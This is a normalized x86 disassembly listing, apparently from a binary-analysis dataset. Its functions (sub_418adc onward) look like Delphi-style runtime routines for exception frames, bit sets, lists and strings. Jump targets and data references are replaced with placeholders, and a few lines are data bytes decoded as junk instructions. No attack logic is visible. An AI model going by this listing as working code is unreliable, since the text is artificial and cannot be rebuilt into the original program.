mov eax [ ebx + 0x8 ]
call sub_4026fc
mov edx edi
mov eax ebp
call sub_418a2c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028d8
sub_418adc
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_418a14
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_418a38
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418b08
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418b80
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_41bb58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_418bc0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418c76
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030a4
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c7d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_418c9c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418d31
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030a4
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041b4
mov eax ebx
mov si 0xffff
call sub_403350
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d38
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
mov si 0xffff
call sub_403350
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403350
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042d0
sub_418d43
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403390
mov eax ebx
mov si 0xffff
call sub_403350
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403350
push eax
lea eax [ ebx + 0x4 ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
pop eax
call sub_403208
sub_418da0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418dc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418de0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403208
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418e08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4057bc
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403350
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax edi
call sub_4057bc
mov edx eax
mov eax esi
call sub_418e08
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4057bc
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_418ea0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_418ef5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4057bc
mov edx eax
mov eax edi
call sub_418e08
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418efc
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_418f04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_418f3c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_418f6c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_418fa8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030a4
mov edx esp
mov eax esi
call sub_4041b4
add esp 0x100
pop esi
pop ebx
retn
sub_418fd0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419065
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4030a4
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4041b4
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403350
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_418f90
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408df4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41906c
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
sub_419083
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_419574
mov edx ebx
mov eax esi
call sub_41950c
sub_4190b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_418f90
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4186a4
mov dl 0x1
mov eax ebx
call sub_418f6c
sub_4190e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_418ea0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_419134
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_418ea0
mov eax [ esi + 0x8 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
mov eax esi
call sub_41924c
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_419180
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4191a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418bac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41921e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41924c
mov eax esi
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_4192f8
push eax
mov eax [ ebp - 0x4 ]
call sub_419180
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_41924c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4192a6
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418698
call sub_403154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4192d0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4192f8
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_41930c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4193ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4030a4
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_4041b4
mov eax ebx
mov si 0xffff
call sub_403350
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193c1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
mov eax ebx
mov si 0xffff
call sub_403350
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403350
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4193d4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4042d0
sub_4193d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403fa4
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403350
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40337c
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40337c
call sub_41476c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4194d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40337c
mov edx [ ebp - 0xc ]
call sub_414970
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4026fc
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_4149f4
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_4041b4
sub_4194f0
push ebx
push esi
mov esi edx
call sub_419180
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_41950c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4032e0
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418454
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_41923c
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418ea0
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41853c
sub_419574
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418698
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41874c
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4184a0
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_418ea0
mov eax ebx
call sub_41923c
pop edi
pop esi
pop ebx
retn
sub_4195d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4185b0
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4185b0
call sub_403154
pop edi
pop esi
pop ebx
retn
sub_419614
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419638
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_4190e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_419680
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a264
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4196b0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4196d4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4196f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41979f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419848
xor eax eax
push ebp
push sub_419782
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419789
mov eax [ ebp - 0x4 ]
call sub_419904
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4197b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418bac
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419848
xor eax eax
push ebp
push sub_419830
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419904
retn
sub_419860
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419918
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4198b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a0fc
mov eax [ ebp - 0x8 ]
push eax
push sub_41a3ac
push ebp
call sub_419860
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419918
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4199ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199b4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f74
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40435c
jne r-xdata
sub_4199c4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4199c0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
jmp sub_403908
sub_4199fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419a44
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c80
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4199c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a4b
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_419a54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419b2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419848
xor eax eax
push ebp
push sub_419b0a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b11
mov eax [ ebp - 0x4 ]
call sub_419904
retn
sub_419b48
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419b8d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404410
call sub_408938
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b94
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_419b9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419ca7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403fe8
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404040
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419cae
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f74
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404210
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404210
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404210
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404210
mov ebx eax
test ebx ebx
je r-xdata
sub_419cc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
